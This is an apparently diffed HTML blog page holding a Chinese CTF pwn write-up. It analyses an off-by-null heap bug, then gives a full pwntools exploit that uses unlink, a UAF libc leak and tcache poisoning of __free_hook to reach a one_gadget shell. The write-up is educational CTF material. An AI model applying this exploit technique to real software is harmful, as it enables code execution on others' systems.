@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.1/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
+
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"mark0519.github.io","root":"/","scheme":"Pisces","version":"8.0.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
+  </script>
+
+  <meta name="description" content="Off_by_Null0x00 Pre东北电力大学的一道pwn题，第一次遇到 Off_by_Null 类型的题目，顺便学习了一波unlink">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn-Off_by_Null">
+<meta property="og:url" content="https://mark0519.github.io/2021/06/07/pwn-Off-by-Null/index.html">
+<meta property="og:site_name" content="mark0519的博客">
+<meta property="og:description" content="Off_by_Null0x00 Pre东北电力大学的一道pwn题，第一次遇到 Off_by_Null 类型的题目，顺便学习了一波unlink">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-06-07T11:34:07.000Z">
+<meta property="article:modified_time" content="2021-06-07T14:36:44.367Z">
+<meta property="article:author" content="mark0519">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="python2">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://mark0519.github.io/2021/06/07/pwn-Off-by-Null/">
+
+
+<script class="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>pwn-Off_by_Null | mark0519的博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  body { margin-top: 2rem; }
+
+  .use-motion .menu-item,
+  .use-motion .sidebar,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header {
+    visibility: visible;
+  }
+
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">mark0519的博客</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <section class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Off-by-Null"><span class="nav-number">1.</span> <span class="nav-text">Off_by_Null</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-Pre"><span class="nav-number">1.1.</span> <span class="nav-text">0x00 Pre</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-IDA%E5%88%86%E6%9E%90"><span class="nav-number">1.2.</span> <span class="nav-text">0x01 IDA分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="nav-number">1.3.</span> <span class="nav-text">0x02 利用思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-exp"><span class="nav-number">1.4.</span> <span class="nav-text">0x03 exp</span></a></li></ol></li></ol></div>
+        </section>
+        <!--/noindex-->
+
+        <section class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">mark0519</p>
+  <div class="site-description" itemprop="description">我是mark0519，第一次玩博客的小萌新~</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">34</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/mark0519" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;mark0519" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:sunjiajun@bupt.edu.cn" title="E-Mail → mailto:sunjiajun@bupt.edu.cn" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+        </section>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+      
+
+      
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://mark0519.github.io/2021/06/07/pwn-Off-by-Null/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="mark0519">
+      <meta itemprop="description" content="我是mark0519，第一次玩博客的小萌新~">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="mark0519的博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          pwn-Off_by_Null
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2021-06-07 19:34:07 / 修改时间：22:36:44" itemprop="dateCreated datePublished" datetime="2021-06-07T19:34:07+08:00">2021-06-07</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="Off-by-Null"><a href="#Off-by-Null" class="headerlink" title="Off_by_Null"></a>Off_by_Null</h1><h2 id="0x00-Pre"><a href="#0x00-Pre" class="headerlink" title="0x00 Pre"></a>0x00 Pre</h2><p>东北电力大学的一道pwn题，第一次遇到 Off_by_Null 类型的题目，顺便学习了一波unlink</p>
+<a id="more"></a>
+
+<h2 id="0x01-IDA分析"><a href="#0x01-IDA分析" class="headerlink" title="0x01 IDA分析"></a>0x01 IDA分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">void</span> *ptr; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">  size = read_8bytes();</span><br><span class="line">  ptr = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">6</span> &amp;&amp; chunk_array[i]; ++i )</span><br><span class="line">      ;</span><br><span class="line">    <span class="keyword">if</span> ( i == <span class="number">7</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;List is Full!\n&quot;</span>);</span><br><span class="line">      <span class="built_in">free</span>(ptr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Data: &quot;</span>);</span><br><span class="line">      read_data(ptr, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)size);</span><br><span class="line">      chunk_array[i] = ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">read_data</span><span class="params">(__int64 ptr, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+13h] [rbp-Dh] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; size; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">int</span>)read(<span class="number">0</span>, &amp;buf, <span class="number">1u</span>LL) &lt; <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Read error!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( buf == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)(ptr + i) = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_BYTE *)(i + ptr) = <span class="number">0</span>;                      <span class="comment">// null off by one</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>创建一个chunk的时候，往里面读入数据结尾会补0，null off by one 漏洞</p>
+<h2 id="0x02-利用思路"><a href="#0x02-利用思路" class="headerlink" title="0x02 利用思路"></a>0x02 利用思路</h2><p>总体利用思路就是利用null字节溢出出发unlink构造UAF，然后第一次UAF泄露基地址，第二次构造tcache bin attack修改free hook为one gadget。</p>
+<p>为了null字节溢出修改inuse位，第一个chunk大小位0x*8以复用prev_size位，这里我们构造0x38：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x38</span>,<span class="string">&#x27;A&#x27;</span>) <span class="comment"># chunk 0</span></span><br></pre></td></tr></table></figure>
+
+<p>第二个chunk涉及到需要包含至少一个unsortedbin且不会被放在tcache的区块，故我们选取0x900这一大区快</p>
+<p>同时应为上一次chunk的null字节溢出，会把这个chunk的size位由0x911变成0x900，为了满足unlink的检查，我们同时需要伪造下一个区块的prev_size位,由于区块0x911-&gt;0x900,减小了0x10个字节，故伪造的下一个区块的prev_size位就是改区块的最后0x10字节处</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x900</span>,<span class="string">&#x27;B&#x27;</span>*(<span class="number">0x900</span><span class="number">-0x10</span>)+p64(<span class="number">0x900</span>)) <span class="comment"># chunk 1</span></span><br></pre></td></tr></table></figure>
+
+<p>再来一个和chunk1连在一起触发unlink的区块</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x900</span>,<span class="string">&#x27;C&#x27;</span>) <span class="comment">#chunk 2</span></span><br></pre></td></tr></table></figure>
+
+<p>最后来一个区块隔离top chunk</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;leave_top_chunk&#x27;</span>) <span class="comment">#chunk 3</span></span><br></pre></td></tr></table></figure>
+
+<p>基本的构造就是这样，下面开始利用chunk0的null字节溢出修改chunk1的inuse位</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x38</span>) <span class="comment"># chunk 0</span></span><br></pre></td></tr></table></figure>
+
+<p>这样被free的chunk1 的size位就会 0x911-&gt;0x900</p>
+<p>这样该程序就会判定chunk 1的下一个区块头为我们填入p64(0x900)的位置，即下一区块的prev_size位位0x900</p>
+<p>接着在chunk1中切下来一块，使剩下的部分被放入unsorted bin</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x500</span>,<span class="string">&#x27;B&#x27;</span>) <span class="comment"># chunk 1</span></span><br></pre></td></tr></table></figure>
+
+<p>接着埋入两个指针</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;D&#x27;</span>) <span class="comment">#chunk 4 (for main_arene)</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;E&#x27;</span>) <span class="comment">#chunk 5</span></span><br></pre></td></tr></table></figure>
+
+<p>chunk 4为了获得main_arena以或者基地址</p>
+<p>chunk 5为了构造tcache bin 以实现任意地址写</p>
+<p>接下来就可以触发unlink了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>) <span class="comment"># unlink</span></span><br></pre></td></tr></table></figure>
+
+<p>chunk2 被free之后更具unlink的判定机制，由于原0x900大小的chunk1下一个区块的位chunk2，chunk2 的prev_size位为0x900符合判定，则触发unlink，合并chunk1和chunk2产生一个大区块，且是被free状态，但是构造的chunk 4和chunk 5的指针仍然存在。</p>
+<p>即UAF构造成功</p>
+<p>更具埋下的指针，chunk 4位于chunk 1的0x500处，我们add一个0x500的指针，剩下的区块被放在unsorted bin中，但是chunk 4正好指向unsorted bin的chunk头，可以把fd指针show出来</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x500</span>,<span class="string">&#x27;B&#x27;</span>) <span class="comment"># chunk 1</span></span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;4 : &quot;</span>)</span><br><span class="line">main_arena_96 = u64(p.recv()[<span class="number">0</span>:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base =  main_arena_96 - <span class="number">96</span> - <span class="number">0x3ebc40</span></span><br><span class="line">free_hook = libc_base + <span class="number">0x3ed8e8</span></span><br></pre></td></tr></table></figure>
+
+<p>这样就获得了free hook和libc base的地址</p>
+<p>之后我们free在被unlink的大区块内容的chunk 5，使其进入tcache bin ，然后在通过add改大区块，修改chunk 5的fd指针指向free hook，改为one gadget，即可getshell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#free(5)</span></span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xd00</span>,p64(main_arena_96)*<span class="number">2</span>+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>+<span class="number">8</span>)+p64(<span class="number">0x91</span>)+p64(free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">ogg = libc_base+<span class="number">0x4f432</span></span><br><span class="line">add(<span class="number">0x80</span>,p64(ogg))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;one gadget: &quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(ogg))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x4f432 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./pwn6&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn6&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chioce</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :\n&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,data</span>):</span></span><br><span class="line">    chioce(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size: \n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;\n&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    chioce(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    chioce(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">&#x27;A&#x27;</span>) <span class="comment"># chunk 0</span></span><br><span class="line">add(<span class="number">0x900</span>,<span class="string">&#x27;B&#x27;</span>*(<span class="number">0x900</span><span class="number">-0x10</span>)+p64(<span class="number">0x900</span>)) <span class="comment"># chunk 1</span></span><br><span class="line">add(<span class="number">0x900</span>,<span class="string">&#x27;C&#x27;</span>) <span class="comment">#chunk 2</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;leave_top_chunk&#x27;</span>) <span class="comment">#chunk 3</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x38</span>) <span class="comment"># chunk 0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">&#x27;B&#x27;</span>) <span class="comment"># chunk 1</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;D&#x27;</span>) <span class="comment">#chunk 4 (for main_arene)</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;E&#x27;</span>) <span class="comment">#chunk 5</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>) <span class="comment"># unlink</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">&#x27;B&#x27;</span>) <span class="comment"># chunk 1</span></span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;4 : &quot;</span>)</span><br><span class="line">main_arena_96 = u64(p.recv()[<span class="number">0</span>:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base =  main_arena_96 - <span class="number">96</span> - <span class="number">0x3ebc40</span></span><br><span class="line">free_hook = libc_base + <span class="number">0x3ed8e8</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;&lt;main_arena+96&gt;: &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(main_arena_96))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_base: &quot;</span>+ <span class="built_in">str</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;&lt;__free_hook&gt;: &quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(free_hook))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Free chunk (unsortedbin) | PREV_INUSE   chunk[4]</span></span><br><span class="line"><span class="string">Addr: 0x55fcc1e437a0</span></span><br><span class="line"><span class="string">Size: 0xd11</span></span><br><span class="line"><span class="string">fd: 0x7f724d018ca0</span></span><br><span class="line"><span class="string">bk: 0x7f724d018ca0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#free(5)</span></span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xd00</span>,p64(main_arena_96)*<span class="number">2</span>+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>+<span class="number">8</span>)+p64(<span class="number">0x91</span>)+p64(free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">ogg = libc_base+<span class="number">0x4f432</span></span><br><span class="line">add(<span class="number">0x80</span>,p64(ogg))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;one gadget: &quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(ogg))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x4f432 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>mark0519
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
